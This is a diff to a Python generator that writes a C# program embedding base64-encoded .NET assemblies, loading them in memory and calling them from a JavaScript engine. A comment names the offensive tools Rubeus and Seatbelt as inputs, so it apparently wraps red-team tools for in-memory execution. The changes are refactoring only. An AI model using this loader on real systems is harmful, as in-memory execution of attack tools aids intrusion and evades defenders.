@@ -35,10 +35,9 @@ engine_template = """
 
 func_template = '.SetValue("ASSEMBLY_NAME", new Func<String, String>(ASSEMBLY_NAME_CAP))'
 
-assembly_template = """
-    static String ASSEMBLY_NAME_CAP(String param) {
-        var lib = "BASE64_ASSEMBLY";
-        byte[] lib_bytes = Convert.FromBase64String(lib);
+run_assembly_template = """
+    static String runAssembly(String assemblyb64, String param) {
+        byte[] lib_bytes = Convert.FromBase64String(assemblyb64);
         var assembly = Assembly.Load(lib_bytes);
         MethodInfo method = assembly.EntryPoint;
         var sw = new StringWriter();
@@ -51,28 +50,33 @@ assembly_template = """
         var sw1 = new StreamWriter(Console.OpenStandardOutput());
         sw1.AutoFlush = true;
         Console.SetOut(sw1);
+        Console.SetError(sw1);
         return sw.ToString();
+    }
+"""
+assembly_template = """
+    static String ASSEMBLY_NAME_CAP(String param) {
+        var lib = "BASE64_ASSEMBLY";
+        return runAssembly(lib, param);
     }
 """
 
 main_template = """
     static void Main(string[] args)
     {
-        // Place the user source here
         var source = @"
-               <SCRIPT>
+<SCRIPT>
         ";
-        var s = CreateEngine().Execute(source).GetCompletionValue();
-        Console.WriteLine(s.AsString());
+        CreateEngine().Execute(source).GetCompletionValue();
     }
 """
 
 """
 SCRIPT FORMAT
-<-----
+/*Sources
 rubeus = /path/to/rubeus
 seatbelt = /path/to/seatbelt
------->
+Sources*/
 JS Script
 """
 if __name__ == "__main__":
@@ -81,15 +85,19 @@ if __name__ == "__main__":
         import_builder = list()
         script = ""
         for line in in_script:
-            if line.startswith("<-----"):
+            if line.startswith("/*Sources"):
                 imports_list = True
-            elif line.startswith("----->"):
+            elif line.startswith("Sources*/"):
                 imports_list = False
+            elif line.startswith("#"):
+                # Comment in script
+                pass
             elif imports_list:
                 entry = line.split('=')
-                import_builder.append((entry[0].strip(), entry[1].strip()))
+                if len(entry) == 2:
+                    import_builder.append((entry[0].strip(), entry[1].strip()))
             else:
-                script += line + '\n'
+                script += line
 
     func_list = ""
     lib_list = ""
@@ -105,6 +113,7 @@ if __name__ == "__main__":
 
     with open('out.cs', 'w') as prog:
         prog.write(prog_head_template)
+        prog.write(run_assembly_template)
         prog.write(lib_list)
         prog.write(engine_template.replace("FUNCTION_CALLS", func_list))
         prog.write(main_template.replace("<SCRIPT>", script.replace('"', '""')))
